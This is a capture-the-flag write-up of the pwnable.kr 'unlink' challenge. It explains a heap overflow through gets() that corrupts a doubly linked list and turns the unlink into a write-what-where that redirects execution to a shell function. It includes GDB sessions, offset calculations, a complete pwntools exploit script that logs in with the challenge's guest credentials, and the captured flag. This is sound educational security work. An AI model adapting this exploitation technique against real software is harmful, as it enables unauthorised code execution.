# Unlink 

Good article about unlink corruption: https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6


By running the binary we get:

```
$ ./unlink
here is stack address leak: 0xffea8fa4
here is heap address leak: 0x9f5d5b0
now that you have leaks, get shell!
[input inserted here]
```


**Checksec output**
```
unlink@pwnable:~$ checksec unlink
[*] '/home/unlink/unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Tearing down the code
### The OBJ struct

```C
  4 typedef struct tagOBJ{
  5     struct tagOBJ* fd;
  6     struct tagOBJ* bk;
  7     char buf[8];
  8 }OBJ;
```

node in a doubly linkd list contains:
- backword pointer
- forward pointer
- 8 bytes buffer

total size: 16


### Shell method
```C
 10 void shell(){
 11     system("/bin/sh");
 12 }
```

LOL

### Unlink method
```C
 14 void unlink(OBJ* P){
 15     OBJ* BK;
 16     OBJ* FD;
 17     BK=P->bk;
 18     FD=P->fd;
 19     FD->bk=BK;
 20     BK->fd=FD;
 21 }
```

Classic vulnerable implementation of onlink. Naively unlink a node P by:
1) Take P backword node and set it to P forward node
2) Take P forward node and set it to P backwrd node


### Main mathod

```C
 22 int main(int argc, char* argv[]){
 23     malloc(1024);
 24     OBJ* A = (OBJ*)malloc(sizeof(OBJ));
 25     OBJ* B = (OBJ*)malloc(sizeof(OBJ));
 26     OBJ* C = (OBJ*)malloc(sizeof(OBJ));
 27 
 28     // double linked list: A <-> B <-> C
 29     A->fd = B;
 30     B->bk = A;
 31     B->fd = C;
 32     C->bk = B;
 33 
 34     printf("here is stack address leak: %p\n", &A);
 35     printf("here is heap address leak: %p\n", A);
 36     printf("now that you have leaks, get shell!\n");
 37     // heap overflow!
 38     gets(A->buf);
 39 
 40     // exploit this unlink!
 41     unlink(B);
 42     return 0;
 43 }

```

We have a doubly linked list: A <-> B <-> C, and we control A's buffer.
the buffer is filled by using `gets` (line 38) so we can overflow and fully control B's and C's nodes ;).

We have a stack & heap leaked addresses probably to help us with the ASLR.

B is unlinked.


## Exploiting the unlink

## Theory

Let's imagine what happens behind the scenes of `unlink(B)`

```C
BK = *(P_ADDRESS + 4)
FD = *(P_ADDRESS + 0)
*(FD + 4) = BK
*(BK + 0) = FD
```

**Why is it difficult?**
So let's say we want to write the address of `shell()` to the return address of `unlink()`.

So we can put `shell()`  address in BK, and the return address - 4 in FD.
so `*(FD + 4) = BK` will put the address of shell in the return address of `unlink()`.

The problem is the next line, which will attempt to write to BK (== address of shell()).

so it won't work :(

### Solution
- Store `shell()` address somewhere in the heap (location on the heap == `heap_shell_addresss`)
- Store the address of `saved_ebp` in BK
- Store the `heap_shell_address` in FD


When reaching the `leave` instruction in the function, instead of restoring
the original `ebp` address, the ebp will be pointed to the heap. Then the return
address will be to the `shell()` address.

TODO: Fix, in this way the FD value will override our shell_address in the heap.

## Pratically

shell function address: `0x80484eb`

```
$ readelf -a unlink | grep shell
    73: 080484eb    25 FUNC    GLOBAL DEFAULT   14 shell
```


Now to GDB!

our breakpoints:
```
(gdb) b unlink
Breakpoint 1 at 0x804850a     

(gdb) b *0x804852d
Breakpoint 2 at 0x804852d                   

(gdb) b *0x80485e3
Breakpoint 3 at 0x80485e3  
```


```
(gdb) r
Starting program: /home/unlink/unlink
here is stack address leak: 0xff98e8d4
here is heap address leak: 0x901f410
now that you have leaks, get shell!                   
                  
Breakpoint 3, 0x080485e3 in main ()
```

Now continue, without overflowing.

```
(gdb) c
Continuing.
AAAA

Breakpoint 2, 0x0804852d in unlink ()
```


Heap address: `0x9252000`
```(gdb) info proc map
process 433077
Mapped address spaces:
		 ...
         0x901f000  0x9ce1000    0x21000        0x0 [heap]
		 ...
```


Let's find our AAAA (the `+ 1024` is for the `malloc(1024)` at the beginning of `main()`):

```
(gdb) x/20x 0x901f000 + 1024
0x901f400:      0x00000000      0x00000000      0x00000000      0x00000019
0x901f410:      0x0901f428      0x00000000      0x41414141      0x00000000
0x901f420:      0x00000000      0x00000019      0x0901f440      0x0901f410
0x901f430:      0x00000000      0x00000000      0x00000000      0x00000019
0x901f440:      0x00000000      0x0901f428      0x00000000      0x00000000

(gdb) x/1x 0x901f418
0x901f418:      0x41414141
```

FD_ADDESS = `0x901f428`
BK_ADDESS = `0x901f42C`

Let's replace AAAA with the shell_address:
```
(gdb) set *((int*)0x901f418)=0x80484eb
(gdb) x/1x 0x901f418
0x9252418:      0x080484eb
```
****
shell_address = `0x080484eb`
heap_shell_address =  `0x901f418`

```
(gdb) x/1x $ebp
0xff9bdc28:     0xff9bdc58
```

saved_ebp_address = `0xff9bdc28`

Now we can apply our [solution](#solution):

BUT after playing with the binary in GDB a bit, I figured out that the solution is a bit more complicated than what I initially thought becuase main does not end like a normal function:

```        
		080485ff 8b 4d fc        MOV        ECX,dword ptr [EBP + local_c]
        08048602 c9              LEAVE
        08048603 8d 61 fc        LEA        ESP,[ECX + -0x4]
        08048606 c3              RET
```


so my final solution was:
- Store `shell()` address in the upper 4 bytes of `buffer`
- Store  `heap_shell_address + 4`, inside the lower 4 bytes of `buffer`
- Store the address of `saved_ebp` (which while in `unlink()`, its address is just ebp), inside BK
- Store the address of the lower 4 bytes of `buffer` + 4 in FD

It all sums up to:

```
set *((int*)0x901f418) = 0x901f41C + 4
set *((int*)0x901f41C) = 0x80484eb
set *((int*)0x901f428) = 0x901f418 + 4
set *((int*)0x901f42C) = $ebp
```

ebp value (inside unlink):
```
(gdb) i r ebp
ebp            0xff98e8b8       0xff98e8b8
```

and we get a shell (with GDB, do not get too excited yet)

```
(gdb) set *((int*)0x901f418) = 0x901f41C + 4
(gdb) set *((int*)0x901f41C) = 0x80484eb
(gdb) set *((int*)0x901f428) = 0x901f418 + 4
(gdb) set *((int*)0x901f42C) = $ebp
(gdb) c
Continuing.
$ echo got a shell
got a shell
```


## Crafting the payload
The addresses in the payload will be determined relatively to the leak addresses. Values from GDB are enoguh so we could calculate the relative distance from the leaked addresses.

stack address leak: `0xff98e8d4`
heap address leak: `0x901f410`

ebp value: 
->`stack_address_leak - (example_stack_address_leak - ebp)`
-> `example_stack_address_leak - ebp = 0xff98e8d4 - 0xff98e8b8 = 28`
-> `stack_address_leak - 28`

 b->fd address:
-> `heap_address_leak - (example_heap_address_leak - FD_ADDRESS)`
-> `example_heap_address_leak - FD_ADDRESS = 0x901f410 - 0x901f428 = -24`
-> `heap_address_leak + 24`

b->bk address:
`b->fd address + 4`

a->buffer address:
-> `heap_address_leak - (example_heap_address_leak - a->buffer address)`
-> `heap_address_leak + 8`


```python
from pwn import *


SHELL_FUNCTION_ADDRESS = 0x80484eb


class StackDistance:
	EBP = -28

class HeapDistance:
	B_FD_ADDRESS = 24
	B_BK_ADDRESS = B_FD_ADDRESS + 4
	A_BUFFER_ADDRESS = 8


def build_payload(heap_address_leak: int, stack_address_leak: int) -> bytes:
	saved_ebp_address = stack_address_leak + StackDistance.EBP
	b_fd_address = heap_address_leak + HeapDistance.B_FD_ADDRESS
	b_bk_address = heap_address_leak + HeapDistance.B_BK_ADDRESS
	a_buffer_address = heap_address_leak + HeapDistance.A_BUFFER_ADDRESS

	return b''.join([
		p32(a_buffer_address + 8),
		p32(SHELL_FUNCTION_ADDRESS),
		p32(0),
		p32(19),
		p32(a_buffer_address + 4),
		p32(saved_ebp_address)
	]) + b'\n'

# Connect to pwnable unlink user via ssh
connection = ssh(user='unlink', port=2222, host='pwnable.kr', password='guest')
unlink_process = connection.run('/home/unlink/unlink')

# Retrieve the stack address
unlink_process.readuntil(b'stack address leak: 0x').decode()
stack_address_leak = unlink_process.readuntil(b'\n').decode().strip()
stack_address_leak = int(stack_address_leak, base=16)

# Retrieve the heap address 
unlink_process.readuntil(b'heap address leak: 0x').decode()
heap_address_leak = unlink_process.readuntil(b'\n').decode().strip()
heap_address_leak = int(heap_address_leak, base=16)

unlink_process.read()

payload = build_payload(heap_address_leak, stack_address_leak)
unlink_process.send(payload)
unlink_process.interactive()
```



```
In [30]: unlink_process.interactive()
[*] Switching to interactive mode
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
$ ^C[*] Interrupted
```